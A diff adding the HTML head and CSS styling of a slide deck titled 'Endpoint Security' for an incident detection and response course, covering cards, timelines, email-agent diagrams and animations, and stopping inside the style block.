@@ -1,0 +1,1932 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Endpoint Security</title>
+  <meta name="description" content="Incident Detection and Response — Endpoint Security: monitoring, controls, and detection." />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --blue-100: #c2d6ff;
+      --blue-200: #93b4fd;
+      --blue-300: #6b93f7;
+      --blue-400: #4a78f0;
+      --blue-500: #3563e9;
+      --blue-600: #2a4ec4;
+      --blue-700: #1e3a9e;
+      --blue-800: #152c78;
+      --blue-900: #0d1d52;
+      --purple-100: #dfc8ff;
+      --purple-200: #c5a0fc;
+      --purple-300: #a87bf5;
+      --purple-400: #8b5cf6;
+      --purple-500: #7c3aed;
+      --purple-600: #6626c9;
+      --purple-700: #4f1d96;
+      --purple-800: #3b1578;
+      --purple-900: #270f52;
+      --accent-green: #34d399;
+      --accent-red: #f87171;
+      --accent-amber: #fbbf24;
+      --bg: #03050a;
+      --bg-surface: #070a14;
+      --bg-card: rgba(8, 12, 24, 0.75);
+      --bg-card-hover: rgba(14, 20, 36, 0.9);
+      --text-primary: #e8ecf4;
+      --text-secondary: #a0aec4;
+      --text-muted: #5c6b84;
+      --text-dim: #3e4a62;
+      --border: rgba(99, 130, 241, 0.1);
+      --border-glow: rgba(99, 130, 241, 0.22);
+      --shadow-sm: 0 1px 4px rgba(0,0,0,0.25);
+      --shadow-md: 0 4px 20px rgba(0,0,0,0.35);
+      --shadow-lg: 0 12px 40px rgba(0,0,0,0.4);
+      --gradient-main: linear-gradient(135deg, var(--blue-500), var(--purple-500));
+      --gradient-soft: linear-gradient(135deg, rgba(53,99,233,0.12), rgba(124,58,237,0.12));
+      --gradient-card: linear-gradient(160deg, rgba(16,22,42,0.8), rgba(30,20,70,0.35));
+      --font-heading: 'Space Grotesk', 'Outfit', system-ui, sans-serif;
+      --font-body: 'Outfit', system-ui, sans-serif;
+      --font-mono: 'JetBrains Mono', monospace;
+    }
+
+    html { font-size: 18px; }
+
+    body {
+      font-family: var(--font-body);
+      background: var(--bg);
+      color: var(--text-primary);
+      overflow: hidden;
+      height: 100vh;
+      width: 100vw;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ===== Static Background ===== */
+    .circuit-bg {
+      position: fixed; inset: 0; z-index: 0;
+      pointer-events: none; opacity: 0.03; overflow: hidden;
+    }
+
+    .orb {
+      position: fixed; border-radius: 50%; filter: blur(100px);
+      z-index: 0; pointer-events: none;
+    }
+    .orb--1 { width: 550px; height: 550px; top: -200px; right: -140px; background: radial-gradient(circle, rgba(53,99,233,0.12) 0%, rgba(124,58,237,0.06) 50%, transparent 70%); }
+    .orb--2 { width: 480px; height: 480px; bottom: -180px; left: -100px; background: radial-gradient(circle, rgba(124,58,237,0.09) 0%, rgba(53,99,233,0.04) 50%, transparent 70%); }
+    .orb--3 { width: 300px; height: 300px; top: 45%; left: 50%; background: radial-gradient(circle, rgba(53,99,233,0.06) 0%, transparent 65%); }
+
+    .shield-watermark { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 0; pointer-events: none; opacity: 0.02; }
+
+    .side-accent { position: fixed; left: 0; top: 0; bottom: 0; width: 4px; background: var(--gradient-main); z-index: 10; }
+
+    /* ===== Top Header ===== */
+    .top-header {
+      position: fixed; top: 0; left: 4px; right: 0; height: 40px;
+      background: rgba(3, 5, 10, 0.85); backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 24px; z-index: 9;
+    }
+    .header-title {
+      font-family: var(--font-heading); font-size: 0.72rem; font-weight: 600;
+      color: var(--text-secondary); letter-spacing: 0.02em;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .header-title .title-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--blue-500); box-shadow: 0 0 8px rgba(53, 99, 233, 0.5); }
+    .header-title .title-sep { color: var(--text-dim); font-weight: 400; }
+    #header-slide-title { color: var(--text-muted); font-weight: 400; font-family: var(--font-mono); font-size: 0.65rem; letter-spacing: 0.04em; }
+    .header-right { display: flex; align-items: center; gap: 14px; }
+
+    /* ===== Lab Badge ===== */
+    .lab-badge {
+      font-family: var(--font-mono); font-size: 0.6rem; font-weight: 600;
+      padding: 0.2em 0.65em; border-radius: 5px; letter-spacing: 0.06em;
+      background: rgba(53,99,233,0.15); color: var(--blue-200);
+      border: 1px solid rgba(53,99,233,0.2);
+    }
+
+    /* ===== Progress Bar ===== */
+    #progress-bar {
+      position: fixed; top: 40px; left: 4px; height: 2px;
+      background: var(--gradient-main);
+      transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+      z-index: 10; border-radius: 0 2px 2px 0;
+      box-shadow: 0 0 14px rgba(99, 102, 241, 0.25);
+    }
+
+    /* ===== Slide Container ===== */
+    #presentation { position: relative; width: 100%; height: 100%; z-index: 1; }
+
+    .slide {
+      position: absolute; inset: 0;
+      display: flex; flex-direction: column; align-items: center;
+      padding: 72px 100px 68px 100px;
+      opacity: 0; transform: translateY(16px);
+      transition: opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1), transform 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+      pointer-events: none;
+      overflow-y: auto; overflow-x: hidden;
+    }
+    .slide.active { opacity: 1; transform: translateY(0); pointer-events: auto; }
+    .slide-inner { max-width: 1060px; width: 100%; margin: auto 0; }
+
+    /* ===== Custom Scrollbar ===== */
+    .slide::-webkit-scrollbar { width: 8px; }
+    .slide::-webkit-scrollbar-track { background: rgba(8, 12, 24, 0.2); }
+    .slide::-webkit-scrollbar-thumb { background: rgba(99, 130, 241, 0.25); border-radius: 4px; }
+    .slide::-webkit-scrollbar-thumb:hover { background: rgba(99, 130, 241, 0.5); }
+
+    /* ===== Typography ===== */
+    h1 { font-family: var(--font-heading); font-size: 3rem; font-weight: 700; line-height: 1.1; margin-bottom: 0.4em; letter-spacing: -0.03em; }
+    h2 { font-family: var(--font-heading); font-size: 2.05rem; font-weight: 700; line-height: 1.18; margin-bottom: 0.5em; letter-spacing: -0.02em; }
+
+    .section-label {
+      display: inline-flex; align-items: center; gap: 8px;
+      font-family: var(--font-mono); font-size: 0.66rem; font-weight: 600;
+      text-transform: uppercase; letter-spacing: 0.14em; margin-bottom: 0.9em;
+      padding: 0.35em 0.9em; border-radius: 6px;
+      background: var(--gradient-soft); border: 1px solid var(--border); color: var(--blue-300);
+    }
+    .section-label .label-icon { font-size: 0.8em; }
+
+    p, li { font-size: 1.08rem; line-height: 1.72; color: var(--text-secondary); }
+    ul { list-style: none; padding: 0; }
+    ul li { position: relative; padding-left: 1.8em; margin-bottom: 0.6em; }
+    ul li::before { content: ''; position: absolute; left: 0; top: 0.5em; width: 10px; height: 10px; border-radius: 3px; border: 2px solid var(--blue-600); background: transparent; transform: rotate(45deg); }
+    ul li::after { content: ''; position: absolute; left: 3px; top: calc(0.5em + 3px); width: 4px; height: 4px; border-radius: 1px; background: var(--gradient-main); transform: rotate(45deg); }
+
+    .gradient-text { background: var(--gradient-main); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+    .blue   { color: var(--blue-300); }
+    .purple { color: var(--purple-300); }
+    .green  { color: var(--accent-green); }
+    .red    { color: var(--accent-red); }
+    .amber  { color: var(--accent-amber); }
+    .mono   { font-family: var(--font-mono); font-size: 0.88em; }
+    .muted  { color: var(--text-muted); }
+    .dim    { color: var(--text-dim); }
+    .small  { font-size: 0.8rem; }
+
+    /* ===== Tags ===== */
+    .tag { display: inline-flex; align-items: center; gap: 5px; padding: 0.2em 0.7em; border-radius: 6px; font-family: var(--font-mono); font-size: 0.68rem; font-weight: 600; letter-spacing: 0.04em; }
+    .tag--blue   { background: rgba(53,99,233,0.15);  color: var(--blue-200);   border: 1px solid rgba(53,99,233,0.2); }
+    .tag--purple { background: rgba(124,58,237,0.15); color: var(--purple-200); border: 1px solid rgba(124,58,237,0.2); }
+    .tag--red    { background: rgba(239,68,68,0.12);  color: #fca5a5;           border: 1px solid rgba(239,68,68,0.15); }
+    .tag--amber  { background: rgba(245,158,11,0.12); color: #fcd34d;           border: 1px solid rgba(245,158,11,0.15); }
+    .tag--green  { background: rgba(34,197,94,0.12);  color: #86efac;           border: 1px solid rgba(34,197,94,0.15); }
+    .tag-dot { width: 5px; height: 5px; border-radius: 50%; background: currentColor; }
+
+    /* ===== Cards ===== */
+    .card-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-top: 1.1em; }
+    .card-row--2 { grid-template-columns: repeat(2, 1fr); }
+    .card-row--3 { grid-template-columns: repeat(3, 1fr); }
+    .card-row--4 { grid-template-columns: repeat(4, 1fr); }
+
+    .card {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 14px;
+      padding: 1.3em 1.35em; box-shadow: var(--shadow-sm);
+      transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative; overflow: hidden;
+    }
+    .card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: var(--gradient-main); opacity: 0; transition: opacity 0.35s ease; }
+    .card:hover { background: var(--bg-card-hover); box-shadow: var(--shadow-lg); transform: translateY(-3px); border-color: var(--border-glow); }
+    .card:hover::before { opacity: 1; }
+    .card h4 { font-family: var(--font-heading); font-size: 0.96rem; font-weight: 600; margin-bottom: 0.35em; color: var(--text-primary); }
+    .card p  { font-size: 0.86rem; color: var(--text-muted); line-height: 1.55; }
+    .card-icon { width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 1.15rem; margin-bottom: 0.75em; }
+    .card-icon--blue   { background: rgba(53,99,233,0.12);  border: 1px solid rgba(53,99,233,0.15); }
+    .card-icon--purple { background: rgba(124,58,237,0.12); border: 1px solid rgba(124,58,237,0.15); }
+    .card-icon--green  { background: rgba(52,211,153,0.12); border: 1px solid rgba(52,211,153,0.15); }
+    .card-icon--amber  { background: rgba(251,191,36,0.12); border: 1px solid rgba(251,191,36,0.15); }
+    .card-icon--red    { background: rgba(248,113,113,0.12); border: 1px solid rgba(248,113,113,0.15); }
+    .card-icon--mixed  { background: var(--gradient-soft); border: 1px solid var(--border); }
+
+    /* ===== Flow Diagram ===== */
+    .flow { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-top: 1.1em; }
+    .flow-step {
+      background: var(--bg-card); backdrop-filter: blur(8px);
+      border: 1px solid var(--border); border-radius: 10px;
+      padding: 0.6em 1.1em; font-size: 0.88rem; font-weight: 500;
+      box-shadow: var(--shadow-sm); white-space: nowrap; transition: all 0.3s ease;
+    }
+    .flow-step:hover { box-shadow: var(--shadow-md); border-color: var(--border-glow); transform: translateY(-1px); }
+    .flow-num { display: inline-flex; align-items: center; justify-content: center; width: 22px; height: 22px; border-radius: 6px; font-family: var(--font-mono); font-size: 0.7rem; font-weight: 600; margin-right: 6px; }
+    .flow-num--1 { background: rgba(53,99,233,0.18);  color: var(--blue-200); }
+    .flow-num--2 { background: rgba(124,58,237,0.18); color: var(--purple-200); }
+    .flow-num--3 { background: rgba(239,68,68,0.14);  color: #fca5a5; }
+    .flow-num--4 { background: rgba(245,158,11,0.14); color: #fcd34d; }
+    .flow-arrow { font-size: 1.1rem; color: var(--blue-600); }
+
+    /* ===== Title Slide ===== */
+    .slide--title { text-align: center; }
+    .slide--title h1 { font-size: 3.3rem; }
+    .slide--title .subtitle { font-size: 1.1rem; color: var(--text-muted); margin-top: 0.15em; max-width: 580px; margin-left: auto; margin-right: auto; }
+    .divider { width: 50px; height: 4px; background: var(--gradient-main); border-radius: 3px; margin: 1em auto; position: relative; }
+    .divider::after { content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); width: 80px; height: 20px; background: var(--gradient-main); filter: blur(16px); opacity: 0.25; border-radius: 10px; }
+
+    /* ===== Instructor Line ===== */
+    .instructor-line {
+      margin-top: 1.6em;
+      font-size: 0.88rem; color: var(--text-muted);
+      font-family: var(--font-body); letter-spacing: 0.01em;
+    }
+    .instructor-line span { color: var(--text-secondary); font-weight: 500; }
+
+    /* ===== Info Box ===== */
+    .info-box {
+      display: flex; align-items: flex-start; gap: 1em;
+      background: var(--gradient-soft); border: 1px solid var(--border-glow);
+      border-radius: 12px; padding: 1em 1.3em; margin-top: 1.2em;
+    }
+    .info-box-icon { flex-shrink: 0; margin-top: 0.1em; width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; }
+    .info-box-icon svg { width: 20px; height: 20px; }
+    .info-box p { font-size: 0.9rem; color: var(--text-secondary); line-height: 1.6; }
+    .info-box strong { color: var(--blue-300); }
+
+    /* ===== Warning Box (red variant of info-box) ===== */
+    .warn-box {
+      display: flex; align-items: flex-start; gap: 1em;
+      background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.25);
+      border-radius: 12px; padding: 1em 1.3em; margin-top: 1.2em;
+    }
+    .warn-box .info-box-icon svg { stroke: var(--accent-red); }
+    .warn-box p { font-size: 0.9rem; color: var(--text-secondary); line-height: 1.6; }
+    .warn-box strong { color: var(--accent-red); }
+
+    /* ===== Cycle Row ===== */
+    .cycle-row {
+      display: flex; align-items: stretch; justify-content: center;
+      gap: 0; margin-top: 1.4em; border-radius: 14px; overflow: hidden;
+      border: 1px solid var(--border); box-shadow: var(--shadow-md);
+    }
+    .cycle-item {
+      flex: 1; display: flex; flex-direction: column; align-items: center;
+      justify-content: center; padding: 1.2em 0.8em; text-align: center;
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      position: relative; transition: background 0.3s ease;
+      border-right: 1px solid var(--border);
+    }
+    .cycle-item:last-child { border-right: none; }
+    .cycle-item:hover { background: var(--bg-card-hover); }
+    .cycle-item::before {
+      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+      opacity: 0; transition: opacity 0.3s ease;
+    }
+    .cycle-item:hover::before { opacity: 1; }
+    .ci-1::before { background: linear-gradient(90deg, var(--blue-500), var(--blue-400)); }
+    .ci-2::before { background: linear-gradient(90deg, var(--blue-600), var(--blue-500)); }
+    .ci-3::before { background: linear-gradient(90deg, var(--purple-600), var(--purple-500)); }
+    .ci-4::before { background: linear-gradient(90deg, var(--accent-red), #fca5a5); }
+
+    .cycle-num {
+      width: 28px; height: 28px; border-radius: 8px; display: flex;
+      align-items: center; justify-content: center; font-family: var(--font-mono);
+      font-size: 0.7rem; font-weight: 700; margin-bottom: 0.6em;
+    }
+    .cycle-num--1 { background: rgba(53,99,233,0.2);  color: var(--blue-200); }
+    .cycle-num--2 { background: rgba(53,99,233,0.16); color: var(--blue-300); }
+    .cycle-num--3 { background: rgba(124,58,237,0.18); color: var(--purple-200); }
+    .cycle-num--4 { background: rgba(248,113,113,0.18); color: #fca5a5; }
+
+    .cycle-label {
+      font-family: var(--font-heading); font-size: 0.95rem; font-weight: 700;
+      color: var(--text-primary); margin-bottom: 0.3em;
+    }
+    .cycle-desc { font-size: 0.75rem; color: var(--text-muted); line-height: 1.5; }
+
+    /* ===== Two-column layout ===== */
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-top: 1em; }
+    .col-block {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 14px;
+      padding: 1.3em 1.4em; position: relative; overflow: hidden;
+    }
+    .col-block::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
+    .col-block--blue::before   { background: linear-gradient(90deg, var(--blue-500), transparent); }
+    .col-block--purple::before { background: linear-gradient(90deg, var(--purple-500), transparent); }
+    .col-block--green::before  { background: linear-gradient(90deg, var(--accent-green), transparent); }
+    .col-block--red::before    { background: linear-gradient(90deg, var(--accent-red), transparent); }
+    .col-block h4 { font-family: var(--font-heading); font-size: 0.95rem; font-weight: 600; color: var(--text-primary); margin-bottom: 0.8em; }
+    .col-block ul { padding: 0; }
+    .col-block ul li { font-size: 0.88rem; margin-bottom: 0.45em; }
+
+    /* ===== Methodology Steps ===== */
+    .method-step { display: flex; align-items: flex-start; gap: 0.8em; margin-bottom: 1em; }
+    .method-step:last-child { margin-bottom: 0; }
+    .method-num {
+      flex-shrink: 0; width: 26px; height: 26px; border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      font-family: var(--font-mono); font-size: 0.72rem; font-weight: 700;
+      background: rgba(53,99,233,0.15); color: var(--blue-200);
+      border: 1px solid rgba(53,99,233,0.2); margin-top: 0.1em;
+    }
+    .method-step ul { margin-top: 0.2em; }
+    .method-step ul li { font-size: 0.84rem; margin-bottom: 0.3em; }
+
+    /* ===== Model / Profile Cards ===== */
+    .model-card {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 16px;
+      padding: 1.6em 1.5em; box-shadow: var(--shadow-md);
+      transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative; overflow: hidden;
+      display: flex; flex-direction: column; gap: 0.7em;
+    }
+    .model-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: var(--gradient-main); opacity: 0; transition: opacity 0.35s ease; }
+    .model-card:hover { background: var(--bg-card-hover); box-shadow: var(--shadow-lg); transform: translateY(-4px); border-color: var(--border-glow); }
+    .model-card:hover::before { opacity: 1; }
+    .model-card .model-icon {
+      width: 44px; height: 44px; border-radius: 10px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .model-card h4 { font-family: var(--font-heading); font-size: 1.0rem; font-weight: 700; color: var(--text-primary); }
+    .model-card p  { font-size: 0.86rem; color: var(--text-muted); line-height: 1.6; }
+    .model-card .model-tag { align-self: flex-start; }
+
+    /* ===== Case Study Card ===== */
+    .case-card {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 16px;
+      padding: 1.4em 1.5em; box-shadow: var(--shadow-md);
+      transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative; overflow: hidden; cursor: pointer;
+    }
+    .case-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: var(--gradient-main); opacity: 0.6; }
+    .case-card:hover { background: var(--bg-card-hover); box-shadow: var(--shadow-lg); transform: translateY(-4px); border-color: var(--border-glow); }
+    .case-card .case-year { font-family: var(--font-heading); font-size: 0.95rem; font-weight: 700; color: var(--blue-300); letter-spacing: 0.03em; margin-bottom: 0.5em; }
+    .case-card h4 { font-family: var(--font-heading); font-size: 1.05rem; font-weight: 600; color: var(--text-secondary); margin-bottom: 0.5em; }
+    .case-card p { font-size: 0.84rem; color: var(--text-muted); line-height: 1.55; }
+    .case-card .case-impact { margin-top: 0.7em; padding-top: 0.7em; border-top: 1px solid var(--border); font-size: 0.78rem; color: var(--accent-red); font-weight: 600; }
+
+    /* ===== Case Study Detail Layout ===== */
+    .case-header { display: flex; align-items: flex-start; justify-content: space-between; gap: 16px; margin-bottom: 1em; flex-wrap: wrap; }
+    .case-meta { display: flex; gap: 8px; flex-wrap: wrap; }
+    .case-stat-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; margin-top: 1.1em; }
+    .case-stat {
+      background: var(--gradient-card); border: 1px solid var(--border); border-radius: 12px;
+      padding: 1em 1.1em; text-align: center;
+    }
+    .case-stat .stat-value { font-family: var(--font-heading); font-size: 1.5rem; font-weight: 700; color: var(--text-primary); }
+    .case-stat .stat-value.red { color: var(--accent-red); }
+    .case-stat .stat-value.amber { color: var(--accent-amber); }
+    .case-stat .stat-value.blue { color: var(--blue-300); }
+    .case-stat .stat-label { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.3em; letter-spacing: 0.03em; }
+
+    .timeline-mini { display: flex; flex-direction: column; gap: 8px; margin-top: 1em; }
+    .tl-mini-item {
+      display: flex; align-items: flex-start; gap: 12px;
+      background: var(--gradient-card); backdrop-filter: blur(12px);
+      border: 1px solid var(--border); border-radius: 10px;
+      padding: 0.65em 1em; transition: all 0.3s ease;
+    }
+    .tl-mini-item:hover { border-color: var(--border-glow); box-shadow: var(--shadow-md); transform: translateY(-2px); }
+    .tl-mini-time { font-family: var(--font-mono); font-size: 0.7rem; color: var(--blue-300); flex-shrink: 0; min-width: 88px; padding-top: 0.15em; }
+    .tl-mini-item p { font-size: 0.85rem; margin: 0; color: var(--text-secondary); }
+    .tl-mini-item strong { color: var(--text-primary); }
+
+    /* ===== Benefit grid (checklist) ===== */
+    .benefit-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 1em; }
+    .benefit-item {
+      background: var(--gradient-card); border: 1px solid var(--border);
+      border-radius: 10px; padding: 0.8em 1em;
+      display: flex; align-items: center; gap: 10px;
+      transition: all 0.3s ease;
+    }
+    .benefit-item:hover { border-color: var(--border-glow); box-shadow: var(--shadow-md); transform: translateY(-2px); }
+    .benefit-check {
+      width: 20px; height: 20px; border-radius: 6px; flex-shrink: 0;
+      background: rgba(53,99,233,0.15); border: 1px solid rgba(53,99,233,0.2);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .benefit-check svg { width: 12px; height: 12px; }
+    .benefit-item span { font-size: 0.85rem; color: var(--text-secondary); }
+
+    /* ===== Bottom Bar ===== */
+    #bottom-bar {
+      position: fixed; bottom: 0; left: 4px; right: 0; height: 46px;
+      display: flex; align-items: center; justify-content: space-between; padding: 0 24px;
+      z-index: 10; background: rgba(3, 5, 10, 0.85); backdrop-filter: blur(16px);
+      border-top: 1px solid var(--border);
+    }
+    .bottom-left { display: flex; align-items: center; gap: 14px; }
+    #slide-counter { font-family: var(--font-mono); font-size: 0.68rem; color: var(--text-muted); letter-spacing: 0.04em; }
+    .nav-controls { display: flex; gap: 6px; }
+    .nav-btn {
+      background: var(--bg-card); border: 1px solid var(--border); color: var(--text-secondary);
+      border-radius: 8px; width: 36px; height: 30px;
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer; font-size: 0.82rem; transition: all 0.25s ease; box-shadow: var(--shadow-sm);
+    }
+    .nav-btn:hover { background: var(--bg-card-hover); color: var(--blue-300); border-color: var(--border-glow); box-shadow: var(--shadow-md); }
+
+    /* ===== Slide element entrance animations ===== */
+    .slide.active li, .slide.active .card, .slide.active .flow-step, .slide.active .model-card,
+    .slide.active .cycle-item, .slide.active .col-block, .slide.active .case-card,
+    .slide.active .case-stat, .slide.active .tl-mini-item, .slide.active .benefit-item {
+      animation: fadeUp 0.5s cubic-bezier(0.4, 0, 0.2, 1) both;
+    }
+    .slide.active li:nth-child(1), .slide.active .card:nth-child(1), .slide.active .flow-step:nth-child(1), .slide.active .model-card:nth-child(1), .slide.active .cycle-item:nth-child(1), .slide.active .col-block:nth-child(1), .slide.active .case-card:nth-child(1), .slide.active .case-stat:nth-child(1), .slide.active .tl-mini-item:nth-child(1), .slide.active .benefit-item:nth-child(1) { animation-delay: 0.06s; }
+    .slide.active li:nth-child(2), .slide.active .card:nth-child(2), .slide.active .flow-step:nth-child(2), .slide.active .model-card:nth-child(2), .slide.active .cycle-item:nth-child(2), .slide.active .col-block:nth-child(2), .slide.active .case-card:nth-child(2), .slide.active .case-stat:nth-child(2), .slide.active .tl-mini-item:nth-child(2), .slide.active .benefit-item:nth-child(2) { animation-delay: 0.12s; }
+    .slide.active li:nth-child(3), .slide.active .card:nth-child(3), .slide.active .flow-step:nth-child(3), .slide.active .model-card:nth-child(3), .slide.active .cycle-item:nth-child(3), .slide.active .col-block:nth-child(3), .slide.active .case-card:nth-child(3), .slide.active .case-stat:nth-child(3), .slide.active .tl-mini-item:nth-child(3), .slide.active .benefit-item:nth-child(3) { animation-delay: 0.18s; }
+    .slide.active li:nth-child(4), .slide.active .card:nth-child(4), .slide.active .flow-step:nth-child(4), .slide.active .cycle-item:nth-child(4), .slide.active .case-card:nth-child(4), .slide.active .tl-mini-item:nth-child(4), .slide.active .benefit-item:nth-child(4) { animation-delay: 0.24s; }
+    .slide.active li:nth-child(5), .slide.active .card:nth-child(5), .slide.active .flow-step:nth-child(5), .slide.active .tl-mini-item:nth-child(5), .slide.active .benefit-item:nth-child(5) { animation-delay: 0.30s; }
+    .slide.active li:nth-child(6), .slide.active .flow-step:nth-child(6), .slide.active .tl-mini-item:nth-child(6), .slide.active .benefit-item:nth-child(6) { animation-delay: 0.36s; }
+    .slide.active li:nth-child(7)  { animation-delay: 0.42s; }
+    .slide.active li:nth-child(8)  { animation-delay: 0.48s; }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* =========================================================
+       MAIL AGENTS — Bob to Alice journey diagram
+       ========================================================= */
+    .mail-actor {
+      position: absolute;
+      display: flex; flex-direction: column; align-items: center;
+      width: 95px; text-align: center; z-index: 2;
+    }
+    .mail-actor-icon {
+      width: 44px; height: 44px; border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 0.5em; box-shadow: var(--shadow-sm);
+    }
+    .mail-actor-icon--person { background: rgba(53,99,233,0.14); border: 1px solid rgba(53,99,233,0.22); }
+    .mail-actor-icon--server { background: rgba(124,58,237,0.14); border: 1px solid rgba(124,58,237,0.22); }
+    .mail-actor-label { font-family: var(--font-heading); font-size: 0.74rem; font-weight: 600; color: var(--text-primary); line-height: 1.35; }
+    .mail-actor-label .dim { font-family: var(--font-body); font-weight: 400; font-size: 0.92em; }
+    .mail-actor-tag { margin-top: 0.5em; }
+    .mail-proto-label {
+      position: absolute; font-family: var(--font-mono); font-size: 0.68rem;
+      color: var(--blue-300); white-space: nowrap; font-weight: 600; z-index: 2;
+    }
+    .mail-relay-label {
+      position: absolute; font-family: var(--font-mono); font-size: 0.62rem;
+      color: var(--text-dim); text-align: center; line-height: 1.4; z-index: 1; width: 140px;
+    }
+
+    /* =========================================================
+       ANIMATED ACTOR / PACKET WORKFLOW DIAGRAMS (Lab2 style)
+       ========================================================= */
+    .anim-container {
+      position: relative;
+      width: 100%; max-width: 900px;
+      margin: 1.2em auto 0;
+      background: rgba(8, 12, 24, 0.6);
+      border: 1px dashed var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: inset 0 0 50px rgba(0,0,0,0.4);
+    }
+    .anim-actor {
+      position: absolute;
+      padding: 0.7rem 0.6rem;
+      background: rgba(14, 20, 36, 0.95);
+      border: 2px solid var(--border);
+      border-radius: 10px;
+      text-align: center;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      font-weight: 600;
+      width: 140px;
+      min-height: 70px;
+      z-index: 2;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 0.4rem;
+      color: var(--text-primary);
+    }
+    .anim-actor.actor-client   { border-color: var(--blue-400); box-shadow: 0 0 18px rgba(74,120,240,0.15); }
+    .anim-actor.actor-smtp     { border-color: var(--purple-500); box-shadow: 0 0 18px rgba(124,58,237,0.15); }
+    .anim-actor.actor-dns      { border-color: var(--accent-amber); box-shadow: 0 0 18px rgba(251,191,36,0.15); }
+    .anim-actor.actor-recv     { border-color: var(--blue-500); box-shadow: 0 0 18px rgba(53,99,233,0.15); }
+    .anim-actor.actor-attacker { border-color: var(--accent-red); box-shadow: 0 0 18px rgba(248,113,113,0.15); }
+    .anim-actor.actor-victim   { border-color: var(--accent-green); box-shadow: 0 0 18px rgba(52,211,153,0.15); }
+    .anim-actor.actor-server   { border-color: var(--blue-400); box-shadow: 0 0 18px rgba(74,120,240,0.15); }
+
+    .anim-data-store {
+      min-height: 36px; display: flex; align-items: stretch; justify-content: center; width: 100%;
+    }
+    .anim-data-store::after {
+      content: attr(data-content);
+      display: flex; align-items: center; justify-content: center;
+      padding: 5px; border-radius: 4px; font-size: 0.62rem; font-weight: 500;
+      width: 100%; border: 1px dashed var(--text-dim);
+      background: rgba(1, 4, 9, 0.5); color: var(--text-muted);
+      transition: all 0.3s ease; white-space: pre-wrap; line-height: 1.4;
+    }
+
+    .anim-packet {
+      position: absolute; left: 0; top: 0;
+      padding: 0.4rem 0.8rem;
+      background: rgba(14, 20, 36, 0.9);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      white-space: nowrap;
+      z-index: 3;
+      opacity: 0;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+      display: flex; align-items: center; gap: 6px;
+      color: var(--text-primary);
+    }
+    .anim-packet::before { content: ""; width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+    .pkt-blue::before   { background: var(--blue-400); box-shadow: 0 0 8px var(--blue-400); }
+    .pkt-purple::before { background: var(--purple-400); box-shadow: 0 0 8px var(--purple-400); }
+    .pkt-green::before  { background: var(--accent-green); box-shadow: 0 0 8px var(--accent-green); }
+    .pkt-red::before    { background: var(--accent-red); box-shadow: 0 0 8px var(--accent-red); }
+    .pkt-amber::before  { background: var(--accent-amber); box-shadow: 0 0 8px var(--accent-amber); }
+
+    .slide:not(.active) .anim-packet,
+    .slide:not(.active) .anim-data-store::after { animation: none !important; }
+    .anim-packet { animation-iteration-count: infinite; animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1); }
+
+    /* ---- Email agent diagram (MUA/MTA/MDA) pulse ---- */
+    @keyframes agentPulse { 0%,100% { box-shadow: 0 0 0 0 rgba(53,99,233,0.25); } 50% { box-shadow: 0 0 0 8px rgba(53,99,233,0); } }
